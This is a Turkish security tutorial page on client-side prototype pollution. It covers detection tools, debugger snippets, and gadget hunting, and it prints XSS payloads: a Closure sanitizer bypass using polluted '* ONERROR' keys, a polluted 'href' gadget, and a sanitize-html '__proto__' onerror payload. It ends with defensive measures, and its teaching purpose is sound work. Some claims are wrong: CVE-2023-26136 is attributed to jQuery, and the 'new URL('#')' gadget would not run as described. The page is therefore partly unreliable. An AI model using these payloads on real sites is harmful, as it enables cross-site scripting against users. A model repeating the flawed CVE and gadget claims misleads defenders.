# Client Side Prototype Pollution

{{#include ../../../banners/hacktricks-training.md}}

## Otomatik Araçlar Kullanarak Keşfetme

Araçlar [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ve** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) **prototip kirlenmesi zafiyetlerini bulmak için** kullanılabilir.

Ayrıca, **prototip kirlenmesi zafiyetleri** için eriştiğiniz **sayfaları** **otomatik olarak** **taramak** amacıyla **PPScan** adlı **tarayıcı uzantısını** da kullanabilirsiniz.

### Bir Özelliğin Kullanıldığı Yeri Hata Ayıklama <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Prototype Pollution'ın Temel Sebebini Bulma <a href="#id-5530" id="id-5530"></a>

Bir prototype pollution zafiyeti herhangi bir araç tarafından belirlendiğinde ve eğer kod aşırı karmaşık değilse, Chrome Geliştirici Araçları'nda `location.hash`, `decodeURIComponent` veya `location.search` gibi anahtar kelimeleri arayarak zafiyeti bulabilirsiniz. Bu yaklaşım, JavaScript kodunun zayıf noktasını belirlemenizi sağlar.

Daha büyük ve karmaşık kod tabanları için, zayıf kodu keşfetmenin basit bir yöntemi aşağıdaki adımları içerir:

1. Bir aracı kullanarak bir zafiyeti belirleyin ve bir özelliği kurucuda ayarlamak için tasarlanmış bir yük elde edin. ppmap tarafından sağlanan bir örnek şöyle görünebilir: `constructor[prototype][ppmap]=reserved`.
2. Sayfada çalışacak ilk JavaScript kodunun satırında bir kesme noktası ayarlayın. Sayfayı yük ile yenileyin ve bu kesme noktasında yürütmeyi durdurun.
3. JavaScript yürütmesi duraklatıldığında, JS konsolunda aşağıdaki betiği çalıştırın. Bu betik, 'ppmap' özelliği oluşturulduğunda sinyal verecek ve kökenini bulmanıza yardımcı olacaktır:
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. **Sources** sekmesine geri dönün ve “Script yürütmesini devam ettir” seçeneğini seçin. JavaScript çalışmaya devam edecek ve 'ppmap' özelliği beklendiği gibi kirletilecektir. Sağlanan kod parçasını kullanarak 'ppmap' özelliğinin kirletildiği tam yeri belirlemek kolaylaşır. **Call Stack**'i inceleyerek, kirlenmenin gerçekleştiği farklı yığınlar gözlemlenebilir.

Hangi yığını inceleyeceğinize karar verirken, genellikle JavaScript kütüphane dosyalarıyla ilişkili yığınları hedeflemek faydalıdır, çünkü prototip kirlenmesi genellikle bu kütüphaneler içinde meydana gelir. İlgili yığını, kütüphane dosyalarına olan bağlantısını inceleyerek belirleyin (sağ tarafta, rehberlik için sağlanan bir resme benzer şekilde görünür). Birden fazla yığın olan senaryolarda, örneğin 4 ve 6. satırlarda, mantıklı seçim 4. satırdaki yığındır, çünkü bu kirlenmenin ilk gerçekleştiği yerdir ve dolayısıyla zafiyetin kök nedenini temsil eder. Yığına tıklamak, sizi zayıf koda yönlendirecektir.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Script Gadget'larını Bulma

Gadget, **bir PP zafiyeti keşfedildiğinde kötüye kullanılacak koddur**.

Uygulama basitse, **`srcdoc/innerHTML/iframe/createElement`** gibi **anahtar kelimeleri** **arama** yapabiliriz ve kaynak kodunu gözden geçirip bunun **javascript yürütmesine yol açıp açmadığını** kontrol edebiliriz. Bazen, bahsedilen teknikler hiç gadget bulamayabilir. Bu durumda, saf kaynak kodu incelemesi bazı güzel gadget'lar ortaya çıkarabilir, aşağıdaki örnekte olduğu gibi.

### Mithil kütüphane kodunda PP gadget bulma örneği

Bu yazıyı kontrol edin: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Zayıf kütüphaneler için yüklerin yeniden derlenmesi

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PP aracılığıyla HTML Sanitizer'ları atlatma

[**Bu araştırma**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) bazı HTML sanitizasyon kütüphaneleri tarafından sağlanan **sanitizasyonları atlatmak için kullanılacak PP gadget'larını** göstermektedir:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Yeni Araçlar & Otomasyon (2023–2025)

* **Burp Suite DOM Invader (v2023.6)** – PortSwigger, parametre adlarını otomatik olarak değiştiren ve tarayıcı uzantısındaki sink noktalarında kirlenmiş özellikleri tespit eden özel bir *Prototype-pollution* sekmesi ekledi (örneğin `__proto__`, `constructor.prototype`). Bir gadget tetiklendiğinde, DOM Invader yürütme yığınını ve özelliğin dereferans edildiği tam satırı gösterir, bu da manuel breakpoint avlamayı gereksiz kılar. *source → sink* arasında hızlı bir geçiş yapmak için yukarıda gösterilen "Property access üzerinde dur" snippet'ı ile birleştirin.
* **protoStalker** – prototip zincirlerini gerçek zamanlı olarak görselleştiren ve `onerror`, `innerHTML`, `srcdoc`, `id` gibi küresel tehlikeli anahtarlara yazmaları işaret eden açık kaynaklı bir Chrome DevTools eklentisi (2024'te yayımlandı). Sadece bir üretim paketi olduğunda ve derleme adımını enstrümante edemediğinizde faydalıdır.
* **ppfuzz 2.0 (2025)** – araç artık ES-modüllerini, HTTP/2 ve WebSocket uç noktalarını destekliyor. Yeni `-A browser` modu, başsız bir Chromium örneği başlatır ve DOM API'lerini brute force ile zorlayarak gadget sınıflarını otomatik olarak numaralandırır (aşağıdaki bölüme bakın).

---

## Son Prototype-Pollution Gadget Araştırmaları (2022–2025)

2023 ortalarında PortSwigger araştırmacıları, *tarayıcıda yerleşik* nesnelerin kirletildiğinde güvenilir XSS gadget'larına dönüştürülebileceğini gösteren bir makale yayımladı. Bu nesneler **her** sayfada bulunduğundan, hedef uygulama kodu kirlenmiş özelliği hiç kullanmasa bile yürütme elde edebilirsiniz.

Örnek gadget (tüm evergreen tarayıcılarda ≥ 2023-04 çalışır):
```html
<script>
// Source (e.g. https://victim/?__proto__[href]=javascript:alert(document.domain))
// For demo we just pollute manually:
Object.prototype.href = 'javascript:alert(`polluted`)' ;

// Sink – URL() constructor implicitly reads `href`
new URL('#'); // breaks into JS; in Chrome you get an alert, Firefox loads "javascript:" URL
</script>
```
Diğer yararlı global gadget'lar, kirlilikten sonra çalıştığı onaylanmıştır (test tarihi 2024-11):

| Gadget sınıfı | Okunan özellik | Elde edilen primitive |
|---------------|----------------|-----------------------|
| `Notification` | `title` | `alert()` bildirim tıklaması ile |
| `Worker` | `name` | Özel Worker'da JS yürütme |
| `Image` | `src` | Geleneksel `onerror` XSS |
| `URLSearchParams` | `toString` | DOM tabanlı Açık Yönlendirme |

Tam 11 gadget listesi ve sandbox kaçışları hakkında tartışma için PortSwigger makalesine bakın.

---

## Dikkate Değer İstemci Tarafı PP CVE'leri (2023-2025)

* **DOMPurify ≤ 3.0.8 – CVE-2024-45801**  Bir saldırgan, temizleyici başlatılmadan önce `Node.prototype.after`'ı kirletebilir, *SAFE_FOR_TEMPLATES* profilini atlayarak saklanan XSS'ye yol açar. Satıcı, `Object.hasOwn()` kontrolleri ve iç haritalar için `Object.create(null)` kullanarak yamanmıştır.
* **jQuery 3.6.0-3.6.3 – CVE-2023-26136 / CVE-2023-26140**  `extend()` `location.hash`'dan gelen işlenmiş nesnelerde kullanılabilir, tarayıcı bağlamında `Object.prototype`'a keyfi özellikler ekler.
* **sanitize-html < 2.8.1 (2023-10) prototype pollution**  `{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}` gibi kötü niyetli bir özellik listesi, izin listesine girmeyi başardı.

Zayıf kütüphane **sadece istemcide** bulunsa bile, sonuçta oluşan XSS, yansıtılan parametreler, postMessage işleyicileri veya daha sonra işlenen saklanan veriler aracılığıyla uzaktan istismar edilebilir.

---

## Modern Savunma Önlemleri

1. **Global prototipi erken dondurun** (ideali ilk script olarak):
```javascript
Object.freeze(Object.prototype);
Object.freeze(Array.prototype);
Object.freeze(Map.prototype);
```
Bu, geç uzantılara dayanan polyfill'leri bozabileceğini unutmayın.
2. `JSON.parse(JSON.stringify(obj))` veya topluluk "deepMerge" parçacıkları yerine `structuredClone()` kullanın – bu, setter'ları/getter'ları göz ardı eder ve prototip zincirini yürütmez.
3. Gerçekten derin bir birleştirme işlevselliğine ihtiyacınız olduğunda, yerleşik prototip sanitasyonu olan **lodash ≥ 4.17.22** veya **deepmerge ≥ 5.3.0**'ı seçin.
4. `script-src 'self'` ve katı bir nonce ile bir Content-Security-Policy ekleyin. CSP, tüm gadget'ları durdurmasa da (örneğin `location` manipülasyonu), `innerHTML` sink'lerinin çoğunu engeller.

## Referanslar

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [https://portswigger.net/research/widespread-prototype-pollution-gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/](https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/)

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
